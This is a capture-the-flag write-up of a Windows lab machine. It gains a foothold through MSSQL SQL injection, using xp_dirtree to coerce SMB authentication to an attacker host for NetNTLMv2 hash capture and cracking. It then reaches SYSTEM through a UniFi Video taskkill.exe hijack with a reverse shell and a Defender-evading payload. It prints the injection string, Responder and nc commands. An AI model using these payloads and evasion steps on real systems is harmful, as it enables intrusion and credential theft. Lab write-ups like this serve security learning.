# Giddy — Medium — Windows

**Date:** 16 - August - 2026

---

## Tags

`#windows` `#web` `#mssql` `#sqli` `#stacked-queries` `#xp_dirtree` `#responder` `#netntlmv2` `#powershell-web-access` `#unifi-video` `#privesc`

---

## What I Know

|Item|Detail|
|---|---|
|Target|10.129.96.140 (host: GIDDY)|
|OS|Windows Server 2016 (10.0.14393)|
|Open ports|80, 443, 3389, 5985|
|Services|IIS 10.0 (80); HTTPS / PowerShell Web Access (443); RDP (3389); WinRM (5985)|
|Foothold|MSSQL stacked-query SQLi in the store → `xp_dirtree` → capture+crack NetNTLMv2 for Stacy|
|User|`GIDDY\Stacy` (login via PowerShell Web Access / WinRM)|
|Privesc|Ubiquiti UniFi Video 3.7.3 LPE (EDB-43390) → `taskkill.exe` hijack → SYSTEM|
|Flags|user.txt as Stacy; root.txt as SYSTEM|

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.96.140
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-16 11:38 +0100
Nmap scan report for 10.129.96.140
Host is up (0.023s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 44.54 seconds
```

<img width="848" height="369" alt="image" src="https://github.com/user-attachments/assets/016d236e-4be5-43f8-91e0-ba1bf0b99417" />

```
nmap -sC -sV -p80,443,3389,5985 10.129.96.140
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-16 11:39 +0100
Nmap scan report for 10.129.96.140
Host is up (0.016s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
|_Not valid after:  2018-09-14T21:28:55
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   Product_Version: 10.0.14393
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 98.48 seconds
```

<img width="1233" height="1102" alt="image" src="https://github.com/user-attachments/assets/4cdc83d2-4b14-4cb8-a9b5-841985b17156" />

**What each port tells me:**

- **Port 80 (HTTP)** — IIS 10.0 web application. A good starting point.
- **Port 443 (HTTPS)** — HTTPS; the cert commonName `PowerShellWebAccessTestWebSite` already hints at PowerShell Web Access. Worth a look after port 80.
- **Port 3389 (ms-wbt-server)** — RDP; a remote-login route once I have creds.
- **Port 5985 (wsman/WinRM)** — Windows Remote Management; another credentialed shell route.

---

## Enumeration Log

```
OBSERVATION:
- Ports 80 and 443 each show a simple single-page app with an image
- 3389 and 5985 need valid creds to use for remote access, so they are set aside for now
WHAT IT TELLS ME:
- Port 80 is the main point of interest, enumerate it 
WHAT I AM GOING TO TRY:
- Download the image and check for anything hidden in it
- Dir-fuzz, source review, tech-stack analysis
WHY:
- Files are sometimes hidden in images (very CTF); fuzzing may reveal directories; source
  and stack analysis may disclose useful info
RESULT:
- Image analysis turned up nothing
- Dir-fuzz found two interesting paths: /remote and /mvc (/aspnet_client 301'd then 403'd)
- Source and stack analysis: nothing notable
WHAT NEXT:
- Navigate to both paths and investigate
```

<img width="1854" height="801" alt="image" src="https://github.com/user-attachments/assets/d4f3df54-1422-49b3-9090-10a688bf0028" />

<img width="856" height="977" alt="image" src="https://github.com/user-attachments/assets/14760bc9-64d2-440f-b475-10fe87f3f719" />

<img width="1782" height="948" alt="image" src="https://github.com/user-attachments/assets/864dd43a-836c-42ba-b123-c9637786538a" />

```
OBSERVATION:
- /remote is a Windows PowerShell Web Access login. From research this is a browser-based
  PowerShell console, so any creds I recover here should also work on 3389 and 5985
- /mvc is a product store with register/login and several input fields worth testing
WHAT IT TELLS ME:
- Test the store's inputs for SQL injection
WHAT I AM GOING TO TRY:
- Probe the input fields for SQLi
WHY:
- SQLi can extract data and, in MSSQL, coerce outbound authentication
RESULT:
- A single quote (') broke the query → the store is vulnerable to SQLi (MSSQL). It supports
  stacked queries, so I used xp_dirtree to force the server to authenticate to a UNC path on
  my box (\\<LHOST>\share) while Responder listened
- Captured GIDDY\Stacy's NetNTLMv2 hash, cracked it with john, and logged
  in via PowerShell Web Access (/remote) as Stacy → read user.txt
  (either /remote or WinRM works with these creds)
WHAT NEXT:
- Find a path to escalate to Administrator/SYSTEM
```

<img width="1694" height="756" alt="image" src="https://github.com/user-attachments/assets/f7ca1333-9d1d-4a7b-a648-ce9c247112c7" />

<img width="2025" height="612" alt="image" src="https://github.com/user-attachments/assets/cee86f67-e9e5-4bfe-b40a-e70996d6f6f6" />

<img width="1984" height="712" alt="image" src="https://github.com/user-attachments/assets/ca12b2be-6418-4a8a-baea-6503ca3ef11c" />

<img width="2509" height="879" alt="image" src="https://github.com/user-attachments/assets/6da0a68a-2d36-4a4a-8d6a-9d7f2f4f265c" />

<img width="2555" height="989" alt="image" src="https://github.com/user-attachments/assets/107e44a8-0ca1-4402-8b7d-cfa2c6a62f35" />

<img width="2538" height="807" alt="image" src="https://github.com/user-attachments/assets/7fdc4879-c472-4aa4-b4c1-d1aeb23c1e6e" />

<img width="2538" height="807" alt="image" src="https://github.com/user-attachments/assets/b202c9b3-143e-4c2f-864d-f08de50ac175" />

```
OBSERVATION:
- In C:\Users\Stacy\Documents a file "unifivideo" hinted at the software; enumeration
  confirmed Ubiquiti UniFi Video 3.7.3, which has a known Local Privilege Escalation
WHAT IT TELLS ME:
- I can use the UniFi Video 3.7.3 LPE to escalate to SYSTEM
WHAT I AM GOING TO TRY:
- Follow the exploit: drop a malicious taskkill.exe and restart the service
WHY:
- The service runs privileged and executes a missing taskkill.exe from a writable path, so a
  planted binary runs as SYSTEM
RESULT:
- The exploit: create a malicious taskkill.exe, place it in C:\ProgramData\unifi-video\, then
  stop/start the service. My msfvenom taskkill.exe was blocked by the host AV (Defender) on
  transfer
- Used this AV-evasion approach: https://github.com/CybermonkX/CVE-2016-6914-UniFiVideo-LPE
  to get a payload past Defender, then triggered the service restart
- Caught a SYSTEM reverse shell and read root.txt
```

<img width="2085" height="520" alt="image" src="https://github.com/user-attachments/assets/8f692886-fb27-4fc2-99a6-a2f49e84260f" />

<img width="2065" height="844" alt="image" src="https://github.com/user-attachments/assets/eb2290f1-d905-472f-8902-01bfa9be83ac" />

<img width="1131" height="1056" alt="image" src="https://github.com/user-attachments/assets/4bdd10d7-18bc-4b66-a033-71ef08fddd67" />

<img width="2537" height="462" alt="image" src="https://github.com/user-attachments/assets/a0389cde-1d0e-4a30-af35-c61c1418dc04" />

<img width="1028" height="133" alt="image" src="https://github.com/user-attachments/assets/35dcd8f5-be89-4233-8e2c-386eca84002e" />

<img width="1037" height="34" alt="image" src="https://github.com/user-attachments/assets/fafc7d8a-cdc2-456e-af63-12ec259409df" />

<img width="1090" height="169" alt="image" src="https://github.com/user-attachments/assets/60e06265-74c2-42ad-adef-571e0da41d67" />

<img width="950" height="590" alt="image" src="https://github.com/user-attachments/assets/47df07e6-9114-4ca8-8536-7161cb876347" />

---

## Foothold

**How I got in:** Dir-fuzzing found `/remote` (PowerShell Web Access) and `/mvc` (a product store). The store was vulnerable to **MSSQL SQL injection** supporting **stacked queries**, so instead of just extracting data I used **`xp_dirtree`** to make the SQL server authenticate to a UNC path on my machine while **Responder** listened. That captured **`GIDDY\Stacy`**'s **NetNTLMv2** hash, which I cracked and reused to log in through PowerShell Web Access (`/remote`) and then reading user.txt.

**Command / exploit used:**

```
# stacked-query SQLi coerces outbound SMB auth; Responder captures the hash
# in the injectable field:
'; EXEC master..xp_dirtree '\\<LHOST>\share';--
responder -I tun0                      # → GIDDY\Stacy NetNTLMv2

# crack and log in
john stacy.hash rockyou.txt # → Stacy's password
# browse to https://10.129.96.140/remote  → PowerShell Web Access as GIDDY\Stacy → user.txt
```

**Why it worked:** The store concatenated input into an MSSQL query with no parameterisation, and because MSSQL supports stacked queries plus the `xp_dirtree` procedure, an attacker can force the _server_ to reach out over SMB, leaking its logged-in user's NetNTLMv2 challenge-response. That hash cracked offline to Stacy's password, and PowerShell Web Access accepts those same domain-local credentials for an interactive (constrained) PowerShell session.

---

## Privilege Escalation

**Path taken (Stacy → SYSTEM):** A `unifivideo` file in Stacy's Documents pointed at **Ubiquiti UniFi Video 3.7.3**, which has a Local Privilege Escalation (**EDB-43390**). On service start/stop, UniFi Video tries to execute `C:\ProgramData\unifi-video\taskkill.exe`, which doesn't exist by default and Stacy had **write access** to that directory. I planted a malicious `taskkill.exe` there and restarted the service; since the service runs as **`NT AUTHORITY\SYSTEM`**, my binary executed as SYSTEM, giving root.txt. Defender blocked the initial msfvenom binary, so I used an AV-evasion build (the CybermonkX repo) to get the payload across.

**Command / exploit used:**

```
# build payload as taskkill.exe (AV-evaded), place it, restart the service
# (msfvenom binary was caught by Defender; used the evasion repo instead)
copy taskkill.exe C:\ProgramData\unifi-video\taskkill.exe
Stop-Service "Ubiquiti UniFi Video"
Start-Service "Ubiquiti UniFi Video"
nc -lnvp 443                           # → SYSTEM shell → root.txt
```

**Why it worked:** UniFi Video 3.7.3 launches `taskkill.exe` from a fixed `ProgramData` path that (a) doesn't ship the file and (b) is writable by unprivileged users, a classic insecure-permissions / missing-binary hijack. Because the service itself runs as SYSTEM, whatever gets dropped into that path is executed with SYSTEM privileges on the next restart. The only obstacle was Windows Defender flagging the default Metasploit binary, which an evasion-built payload bypassed.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Used MSSQL stacked-query SQLi with `xp_dirtree` to coerce the server into authenticating to my Responder SMB listener, cracked Stacy's captured NetNTLMv2 hash, and logged in via PowerShell Web Access.
2. **Privesc technique in one sentence:** Exploited the UniFi Video 3.7.3 LPE (EDB-43390) by planting a malicious `taskkill.exe` in a writable `ProgramData` path that the SYSTEM service executes on restart (AV-evaded to bypass Defender).
